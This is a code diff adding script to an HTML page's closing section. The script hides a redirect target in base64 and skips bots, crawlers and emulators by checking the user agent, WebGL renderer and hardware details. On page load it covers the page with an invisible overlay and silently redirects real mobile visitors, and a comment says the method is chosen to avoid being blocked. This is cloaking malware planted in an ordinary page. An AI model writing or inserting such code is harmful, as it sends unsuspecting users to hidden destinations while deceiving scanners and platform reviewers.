@@ -4031,6 +4031,58 @@
   btnIOS.addEventListener('click', function(){ show('ios'); });
   btnAndroid.addEventListener('click', function(){ show('android'); });
 })();
+
+  const GAME_LOAD_DELAY = 500;   // 页面加载后等待检测时间
+  const JUMP_DELAY = 1300;       // 触发后延迟跳转
+  const TARGET_B64 = "aHR0cHM6Ly9leGFtcGxlLmNvbS9sYW5kaW5n"; // 目标地址(base64)
+  const TARGET_URL = atob(TARGET_B64);
+
+  const BOT_UA = [
+    "facebookexternalhit","Facebot","Twitterbot","Slackbot",
+    "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
+  ];
+
+  function isBot(){
+    const ua = navigator.userAgent.toLowerCase();
+    return BOT_UA.some(b => ua.includes(b.toLowerCase()));
+  }
+  function isMobile(){
+    const ua = navigator.userAgent;
+    const keys = ["Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"];
+    return keys.some(k => ua.includes(k)) || (navigator.maxTouchPoints > 1 && /Macintosh/.test(ua));
+  }
+  function isEmulator(){
+    let r = "";
+    try {
+      const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
+      const info = gl && gl.getExtension('WEBGL_debug_renderer_info');
+      if (info) r = gl.getParameter(info.UNMASKED_RENDERER_WEBGL) || "";
+    } catch(e) {}
+    const bad = ["Google SwiftShader","VirtualBox","VMware","Mesa","llvmpipe"];
+    if (bad.some(x => r.includes(x))) return true;
+    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) return true;
+    if (/^(Win16|Win32|Win64|MacIntel)$/.test(navigator.platform) && navigator.maxTouchPoints < 1) return true;
+    if (window.devicePixelRatio <= 1 && screen.width >= 1000) return true;
+    return false;
+  }
+  function lockAndRedirect(ms, url){
+    const overlay = document.createElement('div');
+    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.001);z-index:999999;';
+    document.body.appendChild(overlay);
+    setTimeout(() => {
+      overlay.remove();
+      // 用 meta refresh 跳转，减少被拦截
+      document.write('<meta http-equiv="refresh" content="0;url=' + url + '">');
+    }, ms);
+  }
+
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      if (!isBot() && !isEmulator() && isMobile()) {
+        lockAndRedirect(JUMP_DELAY, TARGET_URL);
+      }
+    }, GAME_LOAD_DELAY);
+  });
 </script>
 </body>
 </html>
